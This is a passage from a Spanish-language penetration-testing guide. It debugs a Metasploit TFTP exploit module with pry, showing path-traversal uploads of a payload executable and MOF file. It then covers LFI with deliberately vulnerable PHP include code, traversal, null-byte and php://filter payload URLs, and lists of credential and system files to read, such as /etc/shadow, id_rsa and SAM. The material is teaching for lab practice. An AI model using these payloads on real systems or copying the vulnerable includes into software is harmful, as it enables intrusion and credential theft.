<span class="w">    </span><span class="m">103</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading .mof...&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">104</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;</span>,<span class="w"> </span>mof<span class="o">)</span>
<span class="w">    </span><span class="m">105</span>:<span class="w"> </span>end

<span class="o">[</span><span class="m">3</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; depth</span>
<span class="o">=</span>&gt;<span class="w"> </span><span class="m">10</span>
<span class="o">[</span><span class="m">4</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; levels</span>
<span class="o">=</span>&gt;<span class="w"> </span><span class="s2">&quot;../../../../../../../../../../&quot;</span>
<span class="o">[</span><span class="m">5</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;</span>
</code></pre></div>

<p>Como vemos, el valor de la variable <strong>levels</strong> es (<strong>../../../../../../../../../../</strong>), lo que hace que nos planteemos que no se está almacenando correctamente el valor de nuestro <strong>DEPTH</strong>. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente línea del programa:</p>
<div class="codehilite"><pre><span></span><code><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>.nil?<span class="w"> </span>or<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span>?<span class="w"> </span><span class="m">10</span><span class="w"> </span>:<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
</code></pre></div>

<p>Donde como vemos, se especifica claramente que en caso de que el valor de <strong>DEPTH</strong> valga 0, esta se igualará a 10. Por lo que, deberíamos cambiar la declaración a lo siguiente:</p>
<div class="codehilite"><pre><span></span><code><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
</code></pre></div>

<p>Una vez hecho, podremos ver como los valores de <strong>DEPTH</strong> y de <strong>levels</strong> son declarados correctamente:</p>
<div class="codehilite"><pre><span></span><code>msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options

Module<span class="w"> </span>options<span class="w"> </span><span class="o">(</span>exploit/windows/tftp/exploit_tftp<span class="o">)</span>:

<span class="w">   </span>Name<span class="w">   </span>Current<span class="w"> </span>Setting<span class="w">  </span>Required<span class="w">  </span>Description
<span class="w">   </span>----<span class="w">   </span>---------------<span class="w">  </span>--------<span class="w">  </span>-----------
<span class="w">   </span>DEPTH<span class="w">  </span><span class="m">10</span><span class="w">               </span>no<span class="w">        </span>Levels<span class="w"> </span>to<span class="w"> </span>reach<span class="w"> </span>base<span class="w"> </span>directory
<span class="w">   </span>RHOST<span class="w">                   </span>yes<span class="w">       </span>The<span class="w"> </span>remote<span class="w"> </span>TFTP<span class="w"> </span>server<span class="w"> </span>address
<span class="w">   </span>RPORT<span class="w">  </span><span class="m">69</span><span class="w">               </span>yes<span class="w">       </span>The<span class="w"> </span>remote<span class="w"> </span>TFTP<span class="w"> </span>server<span class="w"> </span>port


Exploit<span class="w"> </span>target:

<span class="w">   </span>Id<span class="w">  </span>Name
<span class="w">   </span>--<span class="w">  </span>----
<span class="w">   </span><span class="m">0</span><span class="w">   </span>Distinct<span class="w"> </span>TFTP<span class="w"> </span><span class="m">3</span>.10<span class="w"> </span>on<span class="w"> </span>Windows


msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>DEPTH<span class="w"> </span><span class="m">0</span>
<span class="nv">DEPTH</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">0</span>
msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOST<span class="w"> </span><span class="m">192</span>.168.1.42
<span class="nv">RHOST</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">192</span>.168.1.42
msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.1.51:4444<span class="w"> </span>
Found<span class="w"> </span>plugin<span class="w"> </span>pry-byebug,<span class="w"> </span>but<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>require<span class="w"> </span><span class="s1">&#39;pry-byebug&#39;</span>
cannot<span class="w"> </span>load<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>--<span class="w"> </span>pry-byebug

From:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span>line<span class="w"> </span><span class="m">86</span><span class="w"> </span>Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

<span class="w">     </span><span class="m">81</span>:<span class="w"> </span>def<span class="w"> </span>exploit
<span class="w">     </span><span class="m">82</span>:<span class="w">   </span><span class="nv">peer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span>
<span class="w">     </span><span class="m">83</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">84</span>:<span class="w">   </span><span class="c1"># Setup the necessary files to do the wbemexec trick</span>
<span class="w">     </span><span class="m">85</span>:<span class="w">   </span>binding.pry
<span class="w"> </span><span class="o">=</span>&gt;<span class="w">  </span><span class="m">86</span>:<span class="w">   </span><span class="nv">exe_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.exe&#39;</span>
<span class="w">     </span><span class="m">87</span>:<span class="w">   </span><span class="nv">exe</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_payload_exe
<span class="w">     </span><span class="m">88</span>:<span class="w">   </span><span class="nv">mof_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.mof&#39;</span>
<span class="w">     </span><span class="m">89</span>:<span class="w">   </span><span class="nv">mof</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_mof<span class="o">(</span>mof_name,<span class="w"> </span>exe_name<span class="o">)</span>
<span class="w">     </span><span class="m">90</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">91</span>:<span class="w">   </span><span class="c1"># Configure how deep we want to traverse</span>
<span class="w">     </span><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
<span class="w">     </span><span class="m">93</span>:<span class="w">   </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">     </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">95</span>:<span class="w">   </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w">     </span><span class="m">96</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">     </span><span class="m">97</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">     </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">99</span>:<span class="w">   </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>
<span class="w">    </span><span class="m">100</span>:<span class="w">   </span><span class="k">select</span><span class="o">(</span>nil,<span class="w"> </span>nil,<span class="w"> </span>nil,<span class="w"> </span><span class="m">1</span><span class="o">)</span>
<span class="w">    </span><span class="m">101</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">102</span>:<span class="w">   </span><span class="c1"># Upload the mof file</span>
<span class="w">    </span><span class="m">103</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading .mof...&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">104</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;</span>,<span class="w"> </span>mof<span class="o">)</span>
<span class="w">    </span><span class="m">105</span>:<span class="w"> </span>end

<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; break 96</span>

<span class="w">  </span>Breakpoint<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span><span class="m">96</span><span class="w"> </span><span class="o">(</span>Enabled<span class="o">)</span><span class="w"> </span>

<span class="w">      </span><span class="m">93</span>:<span class="w">     </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">    </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">95</span>:<span class="w">     </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">96</span>:<span class="w">     </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">97</span>:<span class="w">     </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">    </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">99</span>:<span class="w">     </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>


<span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; c</span>

<span class="w">  </span>Breakpoint<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>First<span class="w"> </span>hit

From:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span>line<span class="w"> </span><span class="m">96</span><span class="w"> </span>Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

<span class="w">     </span><span class="m">81</span>:<span class="w"> </span>def<span class="w"> </span>exploit
<span class="w">     </span><span class="m">82</span>:<span class="w">   </span><span class="nv">peer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span>
<span class="w">     </span><span class="m">83</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">84</span>:<span class="w">   </span><span class="c1"># Setup the necessary files to do the wbemexec trick</span>
<span class="w">     </span><span class="m">85</span>:<span class="w">   </span>binding.pry
<span class="w">     </span><span class="m">86</span>:<span class="w">   </span><span class="nv">exe_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.exe&#39;</span>
<span class="w">     </span><span class="m">87</span>:<span class="w">   </span><span class="nv">exe</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_payload_exe
<span class="w">     </span><span class="m">88</span>:<span class="w">   </span><span class="nv">mof_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.mof&#39;</span>
<span class="w">     </span><span class="m">89</span>:<span class="w">   </span><span class="nv">mof</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_mof<span class="o">(</span>mof_name,<span class="w"> </span>exe_name<span class="o">)</span>
<span class="w">     </span><span class="m">90</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">91</span>:<span class="w">   </span><span class="c1"># Configure how deep we want to traverse</span>
<span class="w">     </span><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
<span class="w">     </span><span class="m">93</span>:<span class="w">   </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">     </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">95</span>:<span class="w">   </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w"> </span><span class="o">=</span>&gt;<span class="w">  </span><span class="m">96</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">     </span><span class="m">97</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">     </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">99</span>:<span class="w">   </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>
<span class="w">    </span><span class="m">100</span>:<span class="w">   </span><span class="k">select</span><span class="o">(</span>nil,<span class="w"> </span>nil,<span class="w"> </span>nil,<span class="w"> </span><span class="m">1</span><span class="o">)</span>
<span class="w">    </span><span class="m">101</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">102</span>:<span class="w">   </span><span class="c1"># Upload the mof file</span>
<span class="w">    </span><span class="m">103</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading .mof...&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">104</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;</span>,<span class="w"> </span>mof<span class="o">)</span>
<span class="w">    </span><span class="m">105</span>:<span class="w"> </span>end

<span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; depth</span>
<span class="o">=</span>&gt;<span class="w"> </span><span class="m">0</span>
<span class="o">[</span><span class="m">3</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; levels</span>
<span class="o">=</span>&gt;<span class="w"> </span><span class="s2">&quot;&quot;</span>
<span class="o">[</span><span class="m">4</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; </span>
</code></pre></div>

<p>Este exploit contaba con otras ligeras modificaciones a hacer, pero con esto ya queda claro la funcionalidad del <strong>pry-byebug</strong>.</p>
<p><strong>2. Burpsuite</strong></p>
<p>Otra opción para los menos valientes (aunque a veces también la aplico), es configurar un proxy desde Burpsuite. Para ello, simplemente en la pestaña de Proxies (<strong>Options</strong>), añadimos un nuevo Proxy, generalmente sobre un puerto aleatorio (puerto 4646 [Bind to Port] a modo de ejmplo). Este puerto, en la pestaña <strong>Request Handling</strong>, debe redireccionar al Host víctima así como al puerto real donde se encuentre el servicio configurado que queremos analizar.</p>
<p>Lo que conseguimos con esto, es que de visualizar el recurso <strong>http://localhost:4646</strong>, nos cargue el mismo contenido que el del servicio web del Host víctima. La utilidad de este procedimiento, es que desde Metasploit a la hora de lanzar cualquier exploit, podemos configurar como IP nuestra IP local (127.0.0.1) así como el puerto 4646 para que todo el tráfico sea interceptado desde Burpsuite y posteriormente redireccionado al Host víctima. Esto nos permite analizar por ejemplo desde el <strong>Repeater</strong> cómo es la respuesta del lado del servidor una vez se envía el exploit al Host víctima.</p>
<h3 id="pentesting-web">Pentesting Web<a class="headerlink" href="#pentesting-web" title="Permanent link">&para;</a></h3>
<h4 id="lfi">LFI<a class="headerlink" href="#lfi" title="Permanent link">&para;</a></h4>
<p>Esta vulnerabilidad nos permite visualizar recursos del sistema efectuando para ello un <strong>Directory Path Transversal</strong>.</p>
<p>A modo de ejemplo, presento a continuación un script en PHP con dicha vulnerabilidad:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
    <span class="k">echo</span> <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>Suponiendo que el fichero se llama <em>file.php</em>, si desde la URL efectuamos la siguiente búsqueda:</p>
<p><code>http://localhost/file.php?file=/etc/passwd</code></p>
<p>Veremos cómo se nos lista el fichero passwd del equipo Linux local. Habrán ocasiones en las que tengamos que recorrer un par de directorios hacia atrás para visualizar el recurso:</p>
<p><code>http://localhost/file.php?file=../../../../../etc/passwd</code></p>
<p>Así como incorporar un <strong>%00</strong> para el bypassing de restricciones implementadas:</p>
<p><code>http://localhost/file.php?file=../../../../../etc/passwd%00</code></p>
<p>Otra forma también de bypassear posibles restricciones es añadiendo un interrogante al final de la petición:</p>
<p><code>http://localhost/file.php?file=../../../../../etc/passwd?</code></p>
<p>Por <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">aquí</a> os dejo un buen recurso para el uso de Wrappers y otras técnicas de bypassing.</p>
<p>Otra consideración a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensión <strong>.php</strong> estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:</p>
<p><code>http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php</code></p>
<p>La idea para no ver <strong>PD9waHAKCSNQcnVlYmEKPz4K1</strong> desde la web, es aplicar el siguiente comando desde terminal:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>curl<span class="w"> </span>--silent<span class="w"> </span>http://localhost/file.php?file<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>prueba.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span>&gt;/dev/null

&lt;?php
<span class="w">    </span><span class="c1">#Prueba</span>
?&gt;
</code></pre></div>

<p>Donde como vemos, se consigue visualizar el recurso PHP.</p>
<p>Recursos interesantes siempre a mirar son los siguientes:</p>
<div class="codehilite"><pre><span></span><code>/etc/issue<span class="w"> </span>
/etc/motd<span class="w"> </span>
/etc/passwd<span class="w"> </span>
/etc/group<span class="w"> </span>
/etc/resolv.conf
/etc/shadow
/home/<span class="o">[</span>USERNAME<span class="o">]</span>/.bash_history<span class="w"> </span>o<span class="w"> </span>.profile
~/.bash_history<span class="w"> </span>o<span class="w"> </span>.profile
<span class="nv">$USER</span>/.bash_history<span class="w"> </span>o<span class="w"> </span>.profile
/root/.bash_history<span class="w"> </span>o<span class="w"> </span>.profile
/etc/mtab<span class="w">  </span>
/etc/inetd.conf<span class="w">  </span>
/var/log/dmessage
.htaccess
config.php
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
/etc/httpd/logs/acces_log<span class="w"> </span>
/etc/httpd/logs/error_log<span class="w"> </span>
/var/www/logs/access_log<span class="w"> </span>
/var/www/logs/access.log<span class="w"> </span>
/usr/local/apache/logs/access_<span class="w"> </span>log<span class="w"> </span>
/usr/local/apache/logs/access.<span class="w"> </span>log<span class="w"> </span>
/var/log/apache/access_log<span class="w"> </span>
/var/log/apache2/access_log<span class="w"> </span>
/var/log/apache/access.log<span class="w"> </span>
/var/log/apache2/access.log
/var/log/apache/error.log
/var/log/apache/access.log
/var/log/httpd/error_log
/var/log/access_log
/var/log/mail
/var/log/sshd.log
/var/log/vsftpd.log
.bash_history
.mysql_history
.my.cnf
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
</code></pre></div>

<p>Así como los siguientes en máquinas Windows:</p>
<div class="codehilite"><pre><span></span><code>c:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\e</span>ula.txt
c:<span class="se">\b</span>oot.ini<span class="w">  </span>
c:<span class="se">\W</span>INDOWS<span class="se">\w</span>in.ini<span class="w">  </span>
c:<span class="se">\W</span>INNT<span class="se">\w</span>in.ini<span class="w">  </span>
c:<span class="se">\W</span>INDOWS<span class="se">\R</span>epair<span class="se">\S</span>AM<span class="w">  </span>
c:<span class="se">\W</span>INDOWS<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\W</span>INNT<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\A</span>pache<span class="w"> </span>Group<span class="se">\A</span>pache<span class="se">\c</span>onf<span class="se">\h</span>ttpd.conf<span class="w">  </span>
c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\A</span>pache<span class="w"> </span>Group<span class="se">\A</span>pache2<span class="se">\c</span>onf<span class="se">\h</span>ttpd.conf<span class="w">  </span>
c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\c</span>onf<span class="se">\h</span>ttpd.conf<span class="w">  </span>
c:<span class="se">\p</span>hp<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\p</span>hp5<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\p</span>hp4<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\a</span>pache<span class="se">\p</span>hp<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\b</span>in<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\h</span>ome2<span class="se">\b</span>in<span class="se">\s</span>table<span class="se">\a</span>pache<span class="se">\p</span>hp.ini<span class="w">  </span>
c:<span class="se">\h</span>ome<span class="se">\b</span>in<span class="se">\s</span>table<span class="se">\a</span>pache<span class="se">\p</span>hp.ini
c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\A</span>pache<span class="w"> </span>Group<span class="se">\A</span>pache<span class="se">\l</span>ogs<span class="se">\a</span>ccess.log<span class="w">  </span>
c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\A</span>pache<span class="w"> </span>Group<span class="se">\A</span>pache<span class="se">\l</span>ogs<span class="se">\e</span>rror.log
c:<span class="se">\W</span>INDOWS<span class="se">\T</span>EMP<span class="se">\ </span><span class="w"> </span>
c:<span class="se">\p</span>hp<span class="se">\s</span>essions<span class="se">\ </span><span class="w"> </span>
c:<span class="se">\p</span>hp5<span class="se">\s</span>essions<span class="se">\ </span><span class="w"> </span>
c:<span class="se">\p</span>hp4<span class="se">\s</span>essions<span class="se">\</span>
windows<span class="se">\r</span>epair<span class="se">\S</span>AM
%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\S</span>AM
%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\S</span>AM
%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>AM
%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\s</span>ystem
%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM
%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\s</span>ystem
</code></pre></div>

<h4 id="lfi-code-examples">LFI Code Examples<a class="headerlink" href="#lfi-code-examples" title="Permanent link">&para;</a></h4>
<p>A continuación, se detallan algunas vulnerabilidades de tipo <strong>LFI</strong> con el código del lado del servidor, para poder practicar en local dichas técnicas.</p>
<p><strong>Basic Includes</strong></p>
<p>Código del servidor:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
<span class="p">{</span>
  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$file</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Petición legítima:</p>
<div class="codehilite"><pre><span></span><code>http://localhost/index.php?file<span class="o">=</span>contact.php
</code></pre></div>

<p>Petición malintencionada:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/var/www/html<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#curl --silent http://localhost/index.php?file=/etc/subgid</span>
s4vitar:100000:65536
</code></pre></div>

<p><strong>Directory traversal attack</strong></p>
<p>Código del servidor:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
<span class="p">{</span>
  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lib/functions/</span><span class="si">$file</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Petición legítima:</p>
<div class="codehilite"><pre><span></span><code>http://localhost/index.php?file<span class="o">=</span>contact.php
</code></pre></div>

<p>Petición malintencionada:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/var/www/html<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#curl --silent http://localhost/index.php?file=../../../../../etc/subgid</span>
s4vitar:100000:65536
</code></pre></div>

<p><strong>Null Byte Injection</strong></p>
<p>Código del servidor:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
<span class="p">{</span>
  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lib/functions/</span><span class="si">$file</span><span class="s2">.php&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Petición legítima:</p>
<div class="codehilite"><pre><span></span><code>http://localhost/index.php?file<span class="o">=</span>contact
</code></pre></div>

<p>Petición malintencionada:</p>
<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>--silent<span class="w"> </span><span class="s2">&quot;http://localhost/index.php?file=../../../../../../../../../etc/subgid%00&quot;</span>
s4vitar:100000:65536
</code></pre></div>

<p>Cabe decir que el <strong>Null Byte Injection</strong> fue arreglado en PHP a partir de la versión <strong>5.3.4</strong>.</p>
<p><strong>Filter Evasion</strong></p>
<p>Código del servidor:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
